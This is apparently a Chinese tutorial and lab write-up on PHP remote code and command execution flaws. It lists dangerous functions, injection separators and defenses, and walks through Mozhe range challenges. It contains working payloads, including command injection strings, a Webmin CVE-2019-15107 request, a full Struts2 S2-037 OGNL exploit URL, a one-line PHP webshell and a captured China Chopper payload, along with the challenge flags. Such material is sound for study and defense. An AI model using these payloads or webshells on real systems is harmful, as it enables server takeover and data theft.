**前言：**在 Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。

![](https://img.yatjay.top/md/202203091543232.png)

# 涉及知识

## 多数Web漏洞形成条件

### 代码层面

1. 可控变量：可以控制的变量，可以通过web传参改变带入到后端的变量值

2. 漏洞函数：使用的是哪个函数对于提交的参数进行操作

### 实际应用层面

应用功能层面的侧重点会决定漏洞的利用方向，比如文件管理平台更容易出现文件上传、文件包含等漏洞

## RCE(remote command/code execute，远程命令/代码执行)漏洞

### 原理

#### 远程代码执行

代码注入攻击与命令注入攻击不同。因为需求设计，后台有时候需要把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。

通过代码注入或远程代码执行（RCE），攻击者可以通过注入攻击执行恶意代码、向网站写webshell、控制整个网站甚至服务器。其实际危害性取决于服务器端解释器的限制（例如，PHP，Python等）。在某些情况下，攻击者可能能够从代码注入升级为命令注入。

通常，代码注入容易发生在应用程序执行却不经过验证代码的情况下。

#### 远程命令执行

**远程系统命令执行**（操作系统命令注入或简称命令注入）是一种注入漏洞。攻击者注入的payload将作为操作系统命令执行。仅当Web应用程序代码包含操作系统调用并且调用中使用了用户输入时，才可能进行OS命令注入攻击。它们不是特定于语言的，命令注入漏洞可能会出现在所有让你调用系统外壳命令的语言中：C，Java，PHP，Perl，Ruby，Python等。

操作系统使用Web服务器的特权执行注入的任意命令。因此，命令注入漏洞本身不会导致整个系统受损。但是，攻击者可能能够使用特权升级和其他漏洞来获得更多访问权限。



### 示例

#### 示例1：RCE(remote code execute，远程代码执行)漏洞

```php
<?php
$code =  $_GET['x']; 
eval($code);  //eval()函数用来执行一个字符串表达式，并返回表达式的值。
?>
```

访问并以GET方式提交参数`http://localhost/pentest/rcetest/rcetest1.php?x=phpinfo();`(记得后带分号)

![](https://img.yatjay.top/md/202203092014983.png)

可见PHP代码执行成功，同理可以读取文件、写入文件

#### 示例2：RCE(remote command execute，远程命令执行)漏洞

```php
<?php
$code =  $_GET['x'];  
echo system($code);  //system()函数执行参数所指定的命令， 并且输出执行结果。成功则返回命令					输出的最后一行， 失败则返回 false
?>
```

访问并以GET方式提交参数`http://localhost/pentest/rcetest/rcetest2.php?x=ipconfig`(记得后不带分号)

![](https://img.yatjay.top/md/202203092021829.png)

可见系统命令执行成功

### 敏感函数

#### 代码执行

```php
eval()    //把字符串作为PHP代码执行
assert()    //检查一个断言是否为 FALSE，可用来执行代码
preg_replace()    //执行一个正则表达式的搜索和替换
call_user_func()//把第一个参数作为回调函数调用
call_user_func_array()//调用回调函数，并把一个数组参数作为回调函数的参数
array_map()        //为数组的每个元素应用回调函数
```
 动态函数$a($b)

由于PHP 的特性原因，PHP 的函数支持直接由拼接的方式调用，这直接导致了PHP 在安全上的控制有加大了难度。不少知名程序中也用到了动态函数的写法，这种写法跟使用`call_user_func()`的初衷一样，用来更加方便地调用函数，但是一旦过滤不严格就会造成代码执行漏洞。

举例：不调用`eval()`
```php
<?php
if(isset($_GET['a'])){
    $a=$_GET['a'];
    $b=$_GET['b'];
    $a($b);
}else{
    echo "
    ?a=assert&amp;b=phpinfo()
    ";
}
```

#### 命令执行

```php
system()        //执行外部程序，并且显示输出
exec()            //执行一个外部程序
shell_exec()    //通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回
passthru()        //执行外部程序并且显示原始输出
pcntl_exec()    //在当前进程空间执行指定程序
popen()            //打开进程文件指针
proc_open()        //执行一个命令，并且打开用来输入/输出的文件指针
```

### 利用

#### 代码执行

此处以php为例，其它语言也存在这类利用。

(1) `preg_replace()`函数：

```
mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
```

当$pattern处存在e修饰符时，$replacement 会被当做php代码执行。

(2)`mixed call_user_func( callable $callbank [ , mixed $parameter [ , mixed $…)`：

第一个参数为回调函数，第二个参数是回调函数的参数

![img](https://img.yatjay.top/md/202203101014675.jpeg)

![img](https://img.yatjay.top/md/202203101014488.jpeg)

(3)`eval()`和`assert()`：

当assert()的参数为字符串时 可执行PHP代码

【区分】：

```php
eval(" phpinfo(); ");【√】 
eval(" phpinfo() ");【X】
assert(" phpinfo(); ");【√】 
assert(" phpinfo() ");【√】
```

#### 命令执行

命令执行（注入）常见可控位置情况有下面几种：

- `system("$arg");` //可控点直接是待执行的程序

如果我们能直接控制$arg，那么就能执行执行任意命令了。

- `system("/bin/prog $arg");` //可控点是传入程序的整个参数

我们能够控制的点是程序的整个参数，我们可以直接用&& || 或 | 等等，利用与、或、管道命令来执行其他命令（可以涉及到很多linux命令行技巧）。

- `system("/bin/prog -p $arg");` //可控点是传入程序的某个参数的值（无引号包裹）

我们控制的点是一个参数，我们也同样可以利用与、或、管道来执行其他命令，情境与二无异。

- `system("/bin/prog --p=\"$arg\"");`//可控点是传入程序的某个参数的值（有双引号包裹）

这种情况压力大一点，有双引号包裹。如果引号没有被转义，我们可以先闭合引号，成为第三种情况后按照第三种情况来利用，如果引号被转义（addslashes），我们也不必着急。linux shell 环境下双引号中间的变量也是可以被解析的，我们可以在双引号内利用反引号执行任意命令 `id`

- `system("/bin/prog --p='$arg'");` //可控点是传入程序的某个参数的值（有单引号包裹）

这是最困难的一种情况，因为单引号内只是一个字符串，我们要先闭合单引号才可以执行命令。如：system(“/bin/prog –p=’aaa’ | id”)

在漏洞检测中，除了有回显的命令注入（比如执行dir 命令或者cat 读取系统文件）；还可以使用盲打的方式，比如curl远程机器的某个目录（看access.log），或者通过dns解析的方式获取到漏洞机器发出的请求。

当我们确定了OS命令注入漏洞后，通常可以执行一些初始命令来获取有关受到破坏的系统的信息。以下是在Linux和Windows平台上常用的一些命令的摘要：

| 命令目的   | linux         | windows         |
| :--------- | :------------ | :-------------- |
| 当前用户名 | `whoami`      | `whoami`        |
| 操作系统   | `uname -a`    | `ver`           |
| 网络配置   | `ifconfig`    | `ipconfig /all` |
| 网络连接   | `netstat -an` | `netstat -an`   |
| 运行进程   | `ps -ef`      | `tasklist`      |

##### 命令分隔符的使用

**在Linux上**， ; 可以用 |、|| 代替

```
;前面的执行完执行后面的

|是管道符，显示后面的执行结果

||当前面的执行出错时执行后面的

 可用 %0A和 \n 换行执行命令
```

**在Windows上**，不能用 ; 可以用&、&&、|、||代替

```
 &前面的语句为假则直接执行后面的

 &&前面的语句为假则直接出错，后面的也不执行

 |直接执行后面的语句

 ||前面出错执行后面的
```

PHP 支持一个执行运算符：反引号（“） PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回

```php
 <?php echo `whoami`;?>
```

效果与函数 shell_exec() 相同，都是以字符串的形式返回一个命令的执行结果，可以保存到变量中

### 检测

#### 白盒——代码审计

在**白盒测试**的过程中，我们可以重点关注危险函数出现的位置（上面所总结的那些）。当存在我们能控制的数据，并且能构造出注入攻击的地方，那么漏洞就是存在的。这类测试可以利用自动化工具来进行。

#### 黑盒

1. 漏洞扫描工具
2. 公开漏洞
3. 手工看参数值及功能点，比如提交参数值中出现了echo等PHP函数

### 危害
#### 远程代码执行

执行脚本代码如PHP、Java、Python脚本

#### 远程命令执行

执行系统命令如Windows、Linux命令

### 防御

- WAF产品

- 变量过滤或固定：变量过滤即对提交变量内容进行过滤，变量固定即固定允许提交的变量值，后者更加实用
- 敏感函数禁用

# 演示案例

## 墨者靶场黑盒功能点命令执行——应用功能

靶场地址：[墨者：命令注入执行分析](https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhe)

进入靶场，可见存在远程命令执行的入口，可能存在RCE漏洞，输入IP可以执行ping命令

![](https://img.yatjay.top/md/202203092106896.png)

系统信息：查看数据包的头部，可以看到系统是Linux系统

![](https://img.yatjay.top/md/202203092108988.png)

通过浏览器提示：阻止**此页面**创建更多对话框，可知前端js检查提内容是否合法

![](https://img.yatjay.top/md/202203092118099.png)

在浏览器禁用js或者抓包后修改可以绕过前端的js检测函数

提交合法参数(即合法IP值)后抓包修改，合法IP值此时已通过前端检查，再改包发送不受js代码影响

提交`iipp=127.0.0.1|ls`(|是管道符，显示后面的执行结果)

![](https://img.yatjay.top/md/202203092121476.png)

得到当前目录下的文件，再次通过RCE执行cat命令查看`key_7261593222402.php`文件，得到flag——`mozhe21a224b9d304c6a2689d39ab4c9`

![](https://img.yatjay.top/md/202203092127476.png)

**注意：**后端代码执行命令时会过滤参数中的空格，直接`cat key_7261593222402.php`无法成功执行，所以cat后面的空格要用`<`代替，才能成功执行

## 墨者靶场白盒代码及命令执行——代码分析

靶场地址：[墨者：PHP代码分析溯源](https://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhe)

访问靶场，显示当前页面源码

```php
-------------当前页面源码----key在根目录------------------

<?php
eval(gzinflate(base64_decode(&40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&)));
?> 
```

分析代码

- base64_decode()函数：base64解码
- gzinflate()函数：使用 DEFLATE 数据格式 压缩给定的字符串
- eval()函数：执行一个字符串表达式，并返回表达式的值。

知道页面代码，将此页面代码放到本地环境或PHP在线运行环境当中执行，先不做eval()命令执行，而是将`gzinflate(base64_decode(&40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&))`的结果字符串输出出来，即

```php
<?php
echo gzinflate(base64_decode('40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA=='));  //注意把&符号换成单引号
?> 
```

执行结果如下

![](https://img.yatjay.top/md/202203111021745.png)

这说明本页面源码在实质上执行的是

```
<?php
eval(echo `$_REQUEST[a]`;; ?> );
?> 
```

**注意：**PHP 支持一个执行运算符：反引号（\`\`）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符“`”的效果与函数 [shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php) 相同。

这说明上述代码的含义是执行代码

```
echo `$_REQUEST[a]`;; ?> 
```

即先将`$_REQUEST[a]`的值作为shell命令执行，再通过echo()函数返回执行结果

于是我们只需以`$_REQUEST[a]`方式(GET、POST方式均可)提交参数即可，参数值可以写系统命令

查看数据包头部得到服务器系统为Linux

![](https://img.yatjay.top/md/202203111014885.png)

因此我们提交的参数应该为Linux系统命令

提交ls命令，执行并返回结果如下

![](https://img.yatjay.top/md/202203111040706.png)

提交查看命令`tac key_30144486917175.php`

![](https://img.yatjay.top/md/202203111047799.png)

拿到flag为`mozhe9f84406fa39fefc0e485a994e47`

**注意：**提交cat命令不能成功显示文件内容，需使用tac命令

**查看文件内容命令小结**

cat   由第一行开始显示内容，并将所有内容输出

tac   从最后一行倒序显示内容，并将所有内容输出

more  根据窗口大小，一页一页的现实文件内容

less  和more类似，但其优点可以往前翻页，而且进行可以搜索字符

head  只显示头几行

tail  只显示最后几行

nl    类似于cat -n，显示时输出行号

## 墨者靶场黑盒层RCE漏洞检测——公开漏洞

靶场地址：[墨者：Webmin未经身份验证的远程代码执行](https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe)

Webmin是目前功能最强大的基于Web的Unix系统管理工具。管理员通过浏览器访问Webmin的各种管理功能并完成相应的管理动作。据统计，互联网上大约有13w台机器使用Webmin。当用户开启Webmin密码重置功能后，攻击者可以通过发送POST请求在目标系统中执行任意命令，且无需身份验证。

2019年8月10日，在pentest上发布了Webmin CVE-2019-15107远程代码执行漏洞。

该漏洞由于password_change.cgi文件在重置密码功能中存在一个代码执行漏洞，该漏洞允许恶意第三方在缺少输入验证的情况下而执行恶意代码，后经知道创宇404实验室发现，该漏洞的存在实则是sourceforge上某些版本的安装包和源码被植入了后门导致的。

打开靶机，看到的是一个POST提交登录界面。对于POST表单提交，我们首先想到的是抓包分析。

![](https://img.yatjay.top/md/202203111121882.png)

抓包分析：随便输入账号密码，通过burp，获得图中的数据包

![](https://img.yatjay.top/md/202203111121957.png)

 在这里我们能看到，页面数据显示为**/session_login.cgi**，而漏洞复现资料里是**/password_change.cgi**，所以在这里要进行修改，对提交的**user=&pass=**进行修改，利用百度漏洞资料中的poc进行模仿构造自己的语句。

```
user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
```

这里的user值要是用的是一个假的用户，使用真实的root测试不成功，只有在发送的用户参数的值不是已知的Linux用户的情况下（而参考链接中是user=root123)，展示进入才会到修改/etc/shadow的地方，触发命令注入漏洞

![](https://img.yatjay.top/md/202203111125422.png)

 这里我在POST提交时插入了pwd命令，当前所在目录为 /usr/share/webmin/acl。

![](https://img.yatjay.top/md/202203111126123.png)

 根据解题方向提示利用Webmin漏洞获取根目录的key，看到根目录下的key.txt

![](https://img.yatjay.top/md/202203111132390.png)

最后，直接执行命令查看根目录下key.txt

```
user=rootxx&pam=&expired=2&old=test|cat /key.txt&new1=test2&new2=test2
```

成功拿到flag为`mozhe8344303f0db494294b65927d3f5`

![](https://img.yatjay.top/md/202203111127204.png)

## Javaweb-Struts2框架类RCE漏洞——漏洞层面

靶场地址：[墨者：Apache Struts2远程代码执行漏洞(S2-037)复现](https://www.mozhe.cn/bug/detail/MmZVaC9DQ2VNeGVtOGRoSVFUcHlwQT09bW96aGUmozhe)

本案例旨在提醒RCE漏洞的产生位置，可能出现在Web框架层面

漏洞编号：CVE-2016-4438

影响范围：Struts 2.3.20 - Struts Struts 2.3.28.1

漏洞概述：在使用REST插件时，可以传递可用于在服务器端执行任意代码的恶意表达式。

EXP:

```
http://124.70.71.251:49122/orders/3/%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23process%3d%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5b0%5d)%2c%23ros%3d(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2c%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2c%23ros)%2c%23ros.flush()%2c%23xx%3d123%2c%23xx.toString.json?command=[command]
```

访问 靶场地址，执行命令并回显

执行`ls`命令，执行命令并回显

![image-20220311203527701](https://img.yatjay.top/md/202203112035348.png)

执行`cat key.txt`命令获得key为`mozhe4249050c7a69f1270dd37964b6f`

![](https://img.yatjay.top/md/202203112037771.png)



## 一句话Webshell后门原理代码执行——拓展说明

本节所讲的代码执行漏洞原理即一句话木马连接Webshell后门的原理，比如中国菜刀的readme.txt文件中提供的php一句话木马为

```php
<?php @eval($_POST['chopper']);?>  //@抑制PHP报错，当将“@”符号放置在一个PHP表达式之前,该表达式可能产生的任何错误信息都被忽略掉。
```

下面实用中国菜刀连接服务器并抓包演示

在`http://localhost/test/test.php`写入上述代码，配置菜刀进行连接，同时使用WSExployer进程抓包工具进行抓包(如无数据包，可以在菜刀中刷新缓存，菜刀就会重新发包)

可见抓到的菜刀发送到网站的数据包是

![](https://img.yatjay.top/md/202203112018771.png)

POST方法提交内容如下，即

```
chopper=$xx%3Dchr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$yy=$_POST;@eval/**/.($xx/**/.($yy[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKGdldF9tYWdpY19xdW90ZXNfZ3BjKCk%2Fc3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSk6JF9QT1NUWyJ6MSJdKTskRj1Ab3BlbmRpcigkRCk7aWYoJEY9PU5VTEwpe2VjaG8oIkVSUk9SOi8vIFBhdGggTm90IEZvdW5kIE9yIE5vIFBlcm1pc3Npb24hIik7fWVsc2V7JE09TlVMTDskTD1OVUxMO3doaWxlKCROPUByZWFkZGlyKCRGKSl7JFA9JEQuIi8iLiROOyRUPUBkYXRlKCJZLW0tZCBIOmk6cyIsQGZpbGVtdGltZSgkUCkpO0AkRT1zdWJzdHIoYmFzZV9jb252ZXJ0KEBmaWxlcGVybXMoJFApLDEwLDgpLC00KTskUj0iXHQiLiRULiJcdCIuQGZpbGVzaXplKCRQKS4iXHQiLiRFLiIKIjtpZihAaXNfZGlyKCRQKSkkTS49JE4uIi8iLiRSO2Vsc2UgJEwuPSROLiRSO31lY2hvICRNLiRMO0BjbG9zZWRpcigkRik7fTtlY2hvKCJ8PC0iKTtkaWUoKTs%3D&z1=RDpcXEpheVByb2dyYW1cXFBIUHN0dWR5XFxQSFBUdXRvcmlhbFxcV1dXXFw%3D
```

![](https://img.yatjay.top/md/202203112019452.png)

因此，菜刀工具本质上是利用RCE漏洞获取Webshell

# 涉及资源

[Java代码审计入门](https://www.cnblogs.com/ermei/p/6689005.html)

[PHP 远程代码执行漏洞复现（CVE-2019-11043）](http://blog.leanote.com/post/snowming/9da184ef24bd)

[墨者：PHP代码分析溯源](https://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhe)

[墨者：命令注入执行分析](https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhe)

[墨者：Webmin未经身份验证的远程代码执行](https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe)

[墨者：Apache Struts2远程代码执行漏洞(S2-037)复现](https://www.mozhe.cn/bug/detail/MmZVaC9DQ2VNeGVtOGRoSVFUcHlwQT09bW96aGUmozhe)

[$_GET和$_POST里面要不要加引号？](https://segmentfault.com/q/1010000004218078)